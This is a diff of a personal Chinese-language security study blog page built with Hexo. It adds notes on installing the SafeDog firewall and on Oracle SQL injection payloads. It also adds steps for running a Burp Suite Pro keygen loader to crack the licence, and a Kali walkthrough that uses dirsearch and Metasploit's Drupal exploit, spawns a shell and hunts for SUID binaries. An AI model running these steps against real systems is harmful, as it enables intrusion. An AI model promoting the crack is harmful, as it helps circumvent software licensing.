@@ -579,6 +579,23 @@ schemata表 - 存储所有数据库名
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/45adb2ac02c9d623f7d0447188f2301.png" alt="45adb2ac02c9d623f7d0447188f2301"></p>
 <p>成功显示</p>
+<h4 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h4><p><a target="_blank" rel="noopener" href="https://www.safedog.cn/website_safedog.html">安全狗下载</a></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240101215506347.png" alt="image-20240101215506347"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240101215541266.png" alt="image-20240101215541266"></p>
+<p>安装前请关闭phpstudy</p>
+<p>在a’pache的根目录下的bin目录运行该命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd.exe -k install -n apache2.4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240101220915117.png" alt="image-20240101220915117"></p>
+<p>出现该命令代表前置完成。</p>
+<p>直接一直点击下一步即可</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240101220115466.png" alt="image-20240101220115466"></p>
+<p>安全狗会自动搜索到apache的安装位置</p>
+<p>直接下一步即可</p>
+<p>到安装到最后会喊你注册一下，直接注册登陆即可</p>
+<p>在物理机试一下注入</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/68549f8a9e605539f11439d3fd655d4.png" alt="68549f8a9e605539f11439d3fd655d4"></p>
+<p>出现该图片代表安全狗配置成功</p>
 <h4 id="Oracle数据库sql注入"><a href="#Oracle数据库sql注入" class="headerlink" title="Oracle数据库sql注入"></a>Oracle数据库sql注入</h4><p>空格需要使用+代替</p>
 <p>Oracle数据库注入时的字符需要有三个字符如abc，def</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union+select+&#x27;abc&#x27;,+&#x27;def&#x27;+from+xxxx</span><br></pre></td></tr></table></figure>
@@ -589,8 +606,56 @@ schemata表 - 存储所有数据库名
 <p>Oracle没有数据库名的概念，所谓数据库名，即数据表的拥有者，也就是用户名。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BANNER在Oracle数据库中是一条内置的SQL函数,它的功能是返回Oracle版本信息。</span><br><span class="line"></span><br><span class="line">具体来说:</span><br><span class="line"></span><br><span class="line">- BANNER是Oracle数据库提供的内置函数之一。</span><br><span class="line">- 当调用SELECT BANNER FROM DUAL时,它会返回Oracle数据库的版本信息。</span><br><span class="line">- 返回信息包含Oracle版本号、编译日期等详细信息。</span><br><span class="line">- 例如对于Oracle 11g,它可能返回:</span><br><span class="line"></span><br><span class="line">Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production</span><br><span class="line"> PL/SQL Release 11.2.0.4.0 - Production</span><br><span class="line"> &quot;CORE   11.2.0.4.0  Production&quot;</span><br><span class="line"> TNS for Linux: Version 11.2.0.4.0 - Production</span><br><span class="line"> NLSRTL Version 11.2.0.4.0 - Production</span><br><span class="line"></span><br><span class="line">- 通过BANNER可以快速获取Oracle数据库的详细版本信息。</span><br><span class="line">- 这对数据库管理和应用开发都很有帮助。</span><br><span class="line"></span><br><span class="line">所以总结来说,BANNER是Oracle内置函数,用于返回数据库版本的详细Banner信息,是常用的Oracle信息获取函数之一。</span><br></pre></td></tr></table></figure>
 
+<h4 id="BurpSuitePro"><a href="#BurpSuitePro" class="headerlink" title="BurpSuitePro"></a>BurpSuitePro</h4><p>请提前安装好jdk19</p>
+<p>解压完压缩包后</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231228210933559.png" alt="image-20231228210933559"></p>
+<p>在根目录下运行cmd</p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar burp-loader-keygen-2_1_06.jar</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231228211134407.png" alt="image-20231228211134407"></p>
+<p>双击运行BurpSuitePro.exe</p>
+<p>将burp suite中的内容（License）copy到Burp Suite Professional中</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231228211918049.png" alt="image-20231228211918049"></p>
+<p>再将Burp Suite Professional的内容返回给burp suite</p>
+<p>后面全部点next即可。</p>
+<p>命令行窗口请不要关闭</p>
+<h6 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h6><p>点击代理，选择其中的“打开内嵌浏览器”</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231228212217901.png" alt="image-20231228212217901"></p>
+<p>在跳出的浏览器中输入要sql注入的网站。</p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>以下操作均在kali中执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.30.139&quot; -x 403,404 </span><br></pre></td></tr></table></figure>
 
+<p>查询该网站有哪些文件，方便后续攻击（耗时很久）</p>
+<p>![屏幕截图 2023-12-29 160951](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/屏幕截图</a> 2023-12-29 160951.png)</p>
+<p>![屏幕截图 2023-12-29 171645](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/屏幕截图</a> 2023-12-29 171645.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>打开msfconsole</p>
+<p>![屏幕截图 2023-12-29 162658](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/屏幕截图</a> 2023-12-29 162658.png)</p>
+<p>每次显示的图都不一样。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>
+
+<p>![屏幕截图 2023-12-29 162724](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/屏幕截图</a> 2023-12-29 162724.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 2</span><br></pre></td></tr></table></figure>
+
+<p>![屏幕截图 2023-12-29 162806](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/屏幕截图</a> 2023-12-29 162806.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p>![屏幕截图 2023-12-29 163526](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/屏幕截图</a> 2023-12-29 163526.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.2.88</span><br></pre></td></tr></table></figure>
+
+<p>![屏幕截图 2023-12-29 162901](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/屏幕截图</a> 2023-12-29 162901.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>![屏幕截图 2023-12-29 163111](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/屏幕截图</a> 2023-12-29 163111.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>![屏幕截图 2023-12-29 163135](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/屏幕截图</a> 2023-12-29 163135-1704118688741.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>![屏幕截图 2023-12-29 163751](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/屏幕截图</a> 2023-12-29 163751.png)</p>
+<h5 id="查询ip下有哪些主机"><a href="#查询ip下有哪些主机" class="headerlink" title="查询ip下有哪些主机"></a>查询ip下有哪些主机</h5><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/QQ%E6%88%AA%E5%9B%BE20231229165559.png" alt="QQ截图20231229165559"></p>
 <h2 id="重要语句"><a href="#重要语句" class="headerlink" title="重要语句"></a>重要语句</h2><p>?id&#x3D;1</p>
 <p>?id&#x3D;1’– -</p>
 <p>?id&#x3D;1’order by 3– -</p>
@@ -702,7 +767,7 @@ schemata表 - 存储所有数据库名
   
   <div class="outer">
     <div id="footer-info" class="inner">
-      &copy; 2023 LancePLM<br>
+      &copy; 2024 LancePLM<br>
       Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | Theme by  <a href="https://github.com/FuShaoLei/hexo-theme-hiya" target="_blank">Hiya</a>
       
         <br>
